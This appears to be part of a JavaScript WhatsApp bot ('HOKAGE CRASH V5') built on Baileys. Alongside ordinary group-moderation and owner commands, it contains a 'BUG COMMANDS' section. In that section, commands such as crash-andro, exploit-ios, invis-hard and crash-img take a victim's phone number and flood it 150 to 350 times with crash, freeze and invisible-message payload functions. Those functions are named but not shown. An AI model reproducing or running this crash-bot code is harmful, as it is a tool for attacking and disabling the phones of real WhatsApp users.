𐓷  _ᴄʀᴀsʜ-ᴀɴᴅʀᴏ_
𐓷  _ᴅᴇʟᴀʏ-ᴀɴᴅʀᴏ_
𐓷  _ғᴄ-ᴀɴᴅʀᴏ_
𐓷  _ᴇxᴘʟᴏɪᴛ-ɪᴏs_
𐓷  _ɪɴᴠɪs-ʜᴀʀᴅ_
𐓷  _ʀᴀᴅɪᴀᴛɪᴏɴ-ᴜɪ_
𐓷  _ᴄᴏᴍʙᴏ-sǫʟ_
𐓷  _ᴄʀᴀsʜ-ɪᴍɢ_

━━━━━━━━━━━━━━━━━━━━
    𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━━━━━━

𐓷  _ᴀᴅᴅᴘʀᴇᴍ_ 
𐓷  _ᴅᴇʟᴘʀᴇᴍ_ 
𐓷  _sᴇʟғ_ 
𐓷  _ᴘᴜʙʟɪᴄ_ 
𐓷  _ᴀɴᴛɪᴅᴇʟᴇᴛᴇ_
𐓷  _ᴀɴᴛɪᴄᴀʟʟ_
𐓷  _ᴀᴜᴛᴏᴠɪᴇᴡsᴛᴀᴛᴜs_
𐓷  _ᴀᴜᴛᴏʟɪᴋᴇsᴛᴀᴛᴜs_
𐓷  _ʙʀᴏᴀᴅᴄᴀsᴛ_

━━━━━━━━━━━━━━━━━━━━
    𝙶𝚁𝙾𝚄𝙿 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━━━━━━

𐓷  _ᴘʀᴏᴍᴏᴛᴇ_
𐓷  _ᴅᴇᴍᴏᴛᴇ_
𐓷  _ᴋɪᴄᴋ_
𐓷  _ᴍᴜᴛᴇ_
𐓷  _ᴜɴᴍᴜᴛᴇ_
𐓷  _ʟᴏᴄᴋ_
𐓷  _ᴜɴʟᴏᴄᴋ_
𐓷  _ᴛᴀɢᴀʟʟ_
𐓷  _ᴇᴠᴇʀʏᴏɴᴇ_
𐓷  _ᴛᴀɢᴀᴅᴍɪɴs_
𐓷  _ᴀᴅᴍɪɴs_
𐓷  _ɢʀᴏᴜᴘʟɪɴᴋ_
𐓷  _ɪɴᴠɪᴛᴇʟɪɴᴋ_
𐓷  _ʀᴇᴠᴏᴋᴇ_
𐓷  _sᴇᴛɢɴᴀᴍᴇ_
𐓷  _sᴇᴛɢᴅᴇsᴄ_
𐓷  _ɢʀᴏᴜᴘɪɴғᴏ_
𐓷  _ᴍᴇᴍʙᴇʀs_
𐓷  _ʜɪᴅᴇᴛᴀɢ_
𐓷  _ᴡᴀʀɴ_
𐓷  _ʀᴇsᴇᴛᴡᴀʀɴ_
𐓷  _ᴡᴀʀɴɪɴɢs_
𐓷  _ᴀɴᴛɪʟɪɴᴋ_
𐓷  _ᴀɴᴛɪᴍᴇᴅɪᴀ_

━━━━━━━━━━━━━━━━━━━━
    ᴄʜᴀɴɴᴇʟ ᴍᴇɴᴜ
━━━━━━━━━━━━━━━━━━━━

𐓷  _ɪᴅᴄʜ_
𐓷  _ᴄᴇᴋɪᴅᴄʜ_

━━━━━━━━━━━━━━━━━━━━
    𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄
━━━━━━━━━━━━━━━━━━━━

𐓷  _ᴘɪɴɢ_
𐓷  _ᴏᴡɴᴇʀ_
𐓷  _ᴅᴇᴠᴇʟᴏᴘᴇʀ_
𐓷  _ᴜᴘᴅᴀᴛᴇs_
𐓷  _ᴄʀᴇᴅɪᴛs_

> 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅`;
  
  await minato.sendMessage(jid, {
    image: { url: "https://files.catbox.moe/s51p6p.jpg" },
    caption: Menu
  }, { quoted: HKQuoted });
  break;
}

    // ═══════════════════════════════════
    //   OTHER COMMANDS
    // ══════════════════════════════════

    case 'ping': {
      const t = Date.now();
      await reply(`🏓 Pong! ${Date.now()-t}ms`);
      break;
    }

    case 'owner': {
      const ownerNum = kontributor[0] || botNumber;
      await minato.sendMessage(jid, {
        contacts: { displayName: '𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅', contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN: 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅\nTEL;type=CELL;waid=${ownerNum}:+${ownerNum}\nEND:VCARD` }] },
      }, { quoted: HKQuoted });
      break;
    }

    case 'developer': {
      await reply(`👨‍💻 *Developer*\n${settings.CREDITS || 'Minato Dev'}\n${settings.COMPANY || 'Bugs Cooperation'}`);
      break;
    }

    case 'updates': {
      await reply(`🔄 *Updates*\nv${settings.BOT_VERSION} – Latest\nChannel: ${settings.REQUIRED_CHANNEL_LINK || ''}`);
      break;
    }

    case 'credits': {
      await reply(`🌟 *Credits*\nDev: ${settings.CREDITS}\nCompany: ${settings.COMPANY}\nLibrary: @whiskeysockets/baileys`);
      break;
    }

   
    // ══════════════════════════════════════════════════════
    //   OWNER COMMANDS
    // ══════════════════════════════════════════════════════
    
    case 'public': {
      if (needOwner()) break;
      setWaSetting(waNum, 'mode', 'public');
      await reply('✅ Mode → public');
      break;
    }

    case 'self': {
      if (needOwner()) break;
      setWaSetting(waNum, 'mode', 'self');
      await reply('✅ Mode → self');
      break;
    }

    case 'addprem': {
      if (needOwner()) break;
      const t = getTargetJid(m, args);
      if (!t) { await reply('Reply or pass number.'); break; }
      await reply(addPremium(t) ? `✅ @${normNum(t)} → premium` : 'Already premium.');
      break;
    }

    case 'delprem': {
      if (needOwner()) break;
      const t = getTargetJid(m, args);
      if (!t) { await reply('Reply or pass number.'); break; }
      await reply(removePremium(t) ? `✅ @${normNum(t)} removed` : 'Not premium.');
      break;
    }

    case 'antidelete': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply('.antidelete on/off'); break; }
      setWaSetting(waNum, 'antidelete', v === 'on');
      await reply(`✅ AntiDelete → ${v}`);
      break;
    }

    case 'anticall': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply('.anticall on/off'); break; }
      setWaSetting(waNum, 'anticall', v === 'on');
      await reply(`✅ AntiCall → ${v}`);
      break;
    }

    case 'autoviewstatus': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply('.autoviewstatus on/off'); break; }
      setWaSetting(waNum, 'autoViewStatus', v === 'on');
      await reply(`✅ Auto view status → ${v}`);
      break;
    }

    case 'autolikestatus': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply('.autolikestatus on/off'); break; }
      setWaSetting(waNum, 'autoLikeStatus', v === 'on');
      await reply(`✅ Auto like status → ${v}`);
      break;
    }


    case 'broadcast': {
      if (needOwner()) break;
      const msg = args.join(' ');
      if (!msg) { await reply('.broadcast <message>'); break; }
      try {
        const contacts = await minato.getContacts?.() || [];
        let sent = 0;
        for (const c2 of contacts) {
          if (!c2.id?.endsWith('@s.whatsapp.net')) continue;
          try { await minato.sendMessage(c2.id, { text: msg }); sent++; await new Promise(r => setTimeout(r, 300)); } catch {}
        }
        await reply(`✅ Broadcast sent to ${sent} contacts.`);
      } catch { await reply('❌ Broadcast failed.'); }
      break;
    }


    // ═══════════════════════════════
    //   GROUP COMMANDS
    // ═══════════════════════════════

    case 'promote': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const t = getTargetJid(m, args);
      if (!t) { await reply('❌ Reply to a member.'); break; }
      await minato.groupParticipantsUpdate(jid, [t], 'promote');
      await reply(`✅ @${normNum(t)} promoted.`);
      break;
    }

    case 'demote': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const t = getTargetJid(m, args);
      if (!t) { await reply('❌ Reply to an admin.'); break; }
      await minato.groupParticipantsUpdate(jid, [t], 'demote');
      await reply(`✅ @${normNum(t)} demoted.`);
      break;
    }

    case 'kick': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const t = getTargetJid(m, args);
      if (!t) { await reply('❌ Reply to a member.'); break; }
      await minato.groupParticipantsUpdate(jid, [t], 'remove');
      await reply(`✅ @${normNum(t)} kicked.`);
      break;
    }

    case 'mute': {
      if (needGroup() || needAdmin()) break;
      await minato.groupSettingUpdate(jid, 'announcement');
      await reply('🔇 Group muted.');
      break;
    }

    case 'unmute': {
      if (needGroup() || needAdmin()) break;
      await minato.groupSettingUpdate(jid, 'not_announcement');
      await reply('🔊 Group unmuted.');
      break;
    }

    case 'lock': {
      if (needGroup() || needAdmin()) break;
      await minato.groupSettingUpdate(jid, 'locked');
      await reply('🔒 Group info locked to admins.');
      break;
    }

    case 'unlock': {
      if (needGroup() || needAdmin()) break;
      await minato.groupSettingUpdate(jid, 'unlocked');
      await reply('🔓 Group info open to all.');
      break;
    }

    case 'tagall':
    case 'everyone': {
      if (needGroup() || needAdmin()) break;
      const mentions = participants.map(p => p.id || p.jid).filter(Boolean);
      const txt = text || '📢 Attention everyone!';
      await minato.sendMessage(jid, { text: `${txt}\n${mentions.map(x => `@${normNum(x)}`).join(' ')}`, mentions }, { quoted: HKQuoted });
      break;
    }

    case 'tagadmins':
    case 'admins': {
      if (needGroup()) break;
      if (!groupAdmins.length) { await reply('No admins found.'); break; }
      const txt = text || '📢 Admins!';
      await minato.sendMessage(jid, {
        text: `${txt}\n${groupAdmins.map(x => `@${normNum(x)}`).join(' ')}`,
        mentions: groupAdmins,
      }, { quoted: HKQuoted });
      break;
    }

    case 'grouplink':
    case 'invitelink': {
      if (needGroup() || needAdmin()) break;
      const code = await minato.groupInviteCode(jid);
      await reply(`🔗 https://chat.whatsapp.com/${code}`);
      break;
    }

    case 'revoke': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      await minato.groupRevokeInvite(jid);
      await reply('✅ Invite link revoked.');
      break;
    }

    case 'groupinfo': {
      if (needGroup()) break;
      const adminNames = participants
        .filter(p => p.admin)
        .map(p => p.full?.notify || p.full?.name || `+${normNum(p.jid || p.id)}`)
        .join(', ') || 'None';
      await reply(
        `📋 *${groupName}*\nDescription: ${groupMetadata.desc || 'None'}\nMembers: ${participants.length}\nAdmins: ${adminNames}\nCreated: ${new Date((groupMetadata.creation||0)*1000).toLocaleString()}`
      );
      break;
    }

    case 'members': {
      if (needGroup()) break;
      const list = participants.map((p,i) => `${i+1}. +${normNum(p.jid||p.id)} ${p.admin ? '👑' : ''}`).join('\n');
      await reply(`👥 *Members (${participants.length})*\n\n${list}`);
      break;
    }

    case 'setgname': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const name = args.join(' ');
      if (!name) { await reply('.setgname <n>'); break; }
      await minato.groupUpdateSubject(jid, name);
      await reply(`✅ Name → ${name}`);
      break;
    }

    case 'setgdesc': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const desc = args.join(' ');
      if (!desc) { await reply('.setgdesc <desc>'); break; }
      await minato.groupUpdateDescription(jid, desc);
      await reply('✅ Description updated.');
      break;
    }

    case 'hidetag': {
      if (needGroup() || needAdmin()) break;
      const mentions2 = participants.map(p => p.id || p.jid).filter(Boolean);
      await minato.sendMessage(jid, { text: text || ' ', mentions: mentions2 });
      break;
    }

    case 'warn': {
      if (needGroup() || needAdmin()) break;
      const t = getTargetJid(m, args);
      if (!t) { await reply('❌ Reply to a member.'); break; }
      const wFile = DB('warnings.json');
      const data  = readJSON(wFile, {});
      const key2  = `${jid}|${normNum(t)}`;
      data[key2]  = (data[key2] || 0) + 1;
      writeJSON(wFile, data);
      await reply(`⚠️ @${normNum(t)} warned (${data[key2]}/3).${data[key2]>=3 ? '\n⚠️ Max warnings reached!' : ''}`);
      break;
    }

    case 'resetwarn': {
      if (needGroup() || needAdmin()) break;
      const t = getTargetJid(m, args);
      if (!t) { await reply('❌ Reply to a member.'); break; }
      const wFile = DB('warnings.json');
      const data  = readJSON(wFile, {});
      delete data[`${jid}|${normNum(t)}`];
      writeJSON(wFile, data);
      await reply(`✅ @${normNum(t)} warnings reset.`);
      break;
    }

    case 'warnings': {
      if (needGroup()) break;
      const t = getTargetJid(m, args);
      if (!t) { await reply('❌ Reply to a member.'); break; }
      const count = (readJSON(DB('warnings.json'), {})[`${jid}|${normNum(t)}`] || 0);
      await reply(`⚠️ @${normNum(t)} has ${count}/3 warnings.`);
      break;
    }

    case 'antilink': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply('.antilink on/off'); break; }
      setGroupFlag('antilink.json', jid, v === 'on');
      await reply(`✅ AntiLink → ${v}`);
      break;
    }

    case 'antimedia': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply('.antimedia on/off'); break; }
      setGroupFlag('antimedia.json', jid, v === 'on');
      await reply(`✅ AntiMedia → ${v}`);
      break;
    }
    

    // ══════════════════════════════════════════════════════
    //   CHANNEL COMMANDS
    // ══════════════════════════════════════════════════════
    
    case 'idch':
    case 'cekidch': {
      const chLink = args[0];
      if (!chLink) { await reply('Usage: .idch <channel link>'); break; }
      if (!chLink.includes('https://whatsapp.com/channel/')) {
        await reply('❌ Must be a valid WhatsApp channel link');
        break;
      }
      try {
        const inviteCode = chLink.split('https://whatsapp.com/channel/')[1];
        const res = await minato.newsletterMetadata('invite', inviteCode);
        const verified = res.verification === 'VERIFIED' ? 'Yes ✅' : 'No ❌';
        const teks = ft(
`📢 *Channel Info*

🆔 ID: ${res.id}
📛 Name: ${res.name}
👥 Followers: ${res.subscribers}
🔘 Status: ${res.state}
✅ Verified: ${verified}`, minato);

        const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
        const msg = await generateWAMessageFromContent(jid, {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body:   proto.Message.InteractiveMessage.Body.fromObject({ text: teks }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: '> HOKAGE CRASH' }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  buttons: [{
                    name: 'cta_copy',
                    buttonParamsJson: JSON.stringify({ display_text: 'Copy ID', copy_code: res.id }),
                  }],
                }),
              }),
            },
          },
        }, { quoted: HKQuoted });
        await minato.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }


    // ══════════════════════════════════
    //   BUG COMMANDS
    // ══════════════════════════════════

    case 'crash-andro': {
      if (!_isOwner) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
      if (!text) return reply(`*Format ❌*\nExample : ${cmd} 242xxx`);

      let pepec = args[0].replace(/[^0-9]/g, "")
       let target = pepec + '@s.whatsapp.net'
   
      const PROTECTED_NUMBER = ["242064828524", "242068906671"];
      let victim = args[0]?.replace(/[^0-9]/g, "") || "";


      if (PROTECTED_NUMBER.includes(victim)) {
        return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
      }

      await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${victim}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${cmd}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`);

      await reaction('⏳');
      await reaction('⌛');
      await doneress();

      for (let i = 0; i < 150; i++) {
        await apollox(target, true);
        await BlankKing(minato, target);
        await PLottiEStc(target);
        await CrashVideo(target);
        await nixelCrashUiMessage(target);
        await nixelCrashUiMessage(target);
        await StuckUi(minato, target, true);
        await UiForceVico(target);
      }
      await reaction('✅');
      break;
    }

    case 'delay-andro': {
      if (!_isOwner) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
      if (!text) return reply(`*Format ❌*\nExample : ${cmd} 242xxx`);
     
       let pepec = args[0].replace(/[^0-9]/g, "")
       let target = pepec + '@s.whatsapp.net'
   
      const PROTECTED_NUMBER = ["242064828524", "242068906671"];
      let victim = args[0]?.replace(/[^0-9]/g, "") || "";

      if (PROTECTED_NUMBER.includes(victim)) {
        return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
      }

      await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${victim}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${cmd}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`);

      await reaction('⏳');
      await reaction('⌛');
      await doneress();

      for (let i = 0; i < 150; i++) {
       await apollox(target, true);
       await boundssex(target);
       await CardVisible(target);
       await CardVisible(target);
       await apollox(target, true);
       await apollox(target, true);
      }
      await reaction('✅');
      break;
    }

    case 'fc-andro': {
      if (!_isOwner) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
      if (!text) return reply(`*Format ❌*\nExample : ${cmd} 242xxx`);

      let pepec = args[0].replace(/[^0-9]/g, "")
       let target = pepec + '@s.whatsapp.net'
   
      const PROTECTED_NUMBER = ["242064828524", "242068906671"];
      let victim = args[0]?.replace(/[^0-9]/g, "") || "";


      if (PROTECTED_NUMBER.includes(victim)) {
        return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
      }

      await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${victim}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${cmd}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`);

      await reaction('⏳');
      await reaction('⌛');
      await doneress();

      for (let i = 0; i < 150; i++) {
       await apollox(target, true);
       await StuckUi(minato, target, true);
       await UiForceVico(target);
       await apollox(target, true);
      }
      await reaction('✅');
      break;
    }

    case 'exploit-ios': {
      if (!_isOwner) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
      if (!text) return reply(`*Format ❌*\nExample : ${cmd} 242xxx`);

      let pepec = args[0].replace(/[^0-9]/g, "")
       let target = pepec + '@s.whatsapp.net'
   
      const PROTECTED_NUMBER = ["242064828524", "242068906671"];
      let victim = args[0]?.replace(/[^0-9]/g, "") || "";


      if (PROTECTED_NUMBER.includes(victim)) {
        return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
      }

      await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${victim}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${cmd}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`);

      await reaction('⏳');
      await reaction('⌛');
      await doneress();

      for (let i = 0; i < 150; i++) {
      await apollox(target, true);
      await BlankKing(minato, target);
      await PLottiEStc(target);
      await invsNewIos(target);
      await invsNewIos(target);
      await invsNewIos(target);
      await iOSInvisble(target);
      await iOSInvisble(target);
      await iOSInvisble(target);
      await UiForceVico(target);
      
      }
      await reaction('✅');
      break;
    }

    case 'invis-hard': {
      if (!_isOwner) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
      if (!text) return reply(`*Format ❌*\nExample : ${cmd} 242xxx`);

      let pepec = args[0].replace(/[^0-9]/g, "")
       let target = pepec + '@s.whatsapp.net'
   
      const PROTECTED_NUMBER = ["242064828524", "242068906671"];
      let victim = args[0]?.replace(/[^0-9]/g, "") || "";


      if (PROTECTED_NUMBER.includes(victim)) {
        return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
      }

      await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${victim}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${cmd}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`);

      await reaction('⏳');
      await reaction('⌛');
      await doneress();

      for (let i = 0; i < 150; i++) {
       await apollox(target, true);
       await apollox(target, true);
       await apollox(target, true);
       await apollox(target, true);
       await apollox(target, true);
       await apollox(target, true);
       await apollox(target, true);
       await apollox(target, true);
       
      }
      await reaction('✅');
      break;
    }
    
    case 'radiation-ui': {
      if (!_isOwner) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
      if (!text) return reply(`*Format ❌*\nExample : ${cmd} 242xxx`);

      let pepec = args[0].replace(/[^0-9]/g, "")
       let target = pepec + '@s.whatsapp.net'
   
      const PROTECTED_NUMBER = ["242064828524", "242068906671"];
      let victim = args[0]?.replace(/[^0-9]/g, "") || "";


      if (PROTECTED_NUMBER.includes(victim)) {
        return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
      }

      await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${victim}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${cmd}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`);

      await reaction('⏳');
      await reaction('⌛');
      await doneress();

      for (let i = 0; i < 150; i++) {
        await apollox(target, true);
        await BlankKing(minato, target);
        await PLottiEStc(target);
        await CrashVideo(target);
        await nixelCrashUiMessage(target);
        await StuckUi(minato, target, true);
        await UiForceVico(target);
      }
      await reaction('✅');
      break;
    }

    case 'combo-sql': {
      if (!_isOwner) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
      if (!text) return reply(`*Format ❌*\nExample : ${cmd} 242xxx`);

      let pepec = args[0].replace(/[^0-9]/g, "")
       let target = pepec + '@s.whatsapp.net'
   
      const PROTECTED_NUMBER = ["242064828524", "242068906671"];
      let victim = args[0]?.replace(/[^0-9]/g, "") || "";


      if (PROTECTED_NUMBER.includes(victim)) {
        return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
      }

      await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${victim}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${cmd}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`);

      await reaction('⏳');
      await reaction('⌛');
      await doneress();

      for (let i = 0; i < 150; i++) {
        await apollox(target, true);
        await BlankKing(minato, target);
        await PLottiEStc(target);
        await CrashVideo(target);
        await StuckUi(minato, target, true);
       await JtwFreze(minato, target);
       await UiForceVico(target);
      }
      await reaction('✅');
      break;
    }
    
    case 'crash-img': {
      if (!_isOwner) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
      if (!text) return reply(`*Format ❌*\nExample : ${cmd} 242xxx`);

      let pepec = args[0].replace(/[^0-9]/g, "")
       let target = pepec + '@s.whatsapp.net'
   
      const PROTECTED_NUMBER = ["242064828524", "242068906671"];
      let victim = args[0]?.replace(/[^0-9]/g, "") || "";


      if (PROTECTED_NUMBER.includes(victim)) {
        return reply("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
      }

      await reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${victim}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${cmd}

© 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻`);

      await reaction('⏳');
      await reaction('⌛');
      await doneress();

      for (let i = 0; i < 350; i++) {
      await apollox(target, true);
        await BlankKing(minato, target);
        await PLottiEStc(target);
        await CrashVideo(target);
        await Flowaderbug2(minato, target);
        await Flowaderbug2(minato, target);
        await JtwFreze(minato, target);
        await StuckUi(minato, target, true);
        await UiForceVico(target);
      }
      await reaction('✅');
      break;
    }
    
    

    default: {
   
      break;
    }
  }
}

module.exports = { handleMessage };
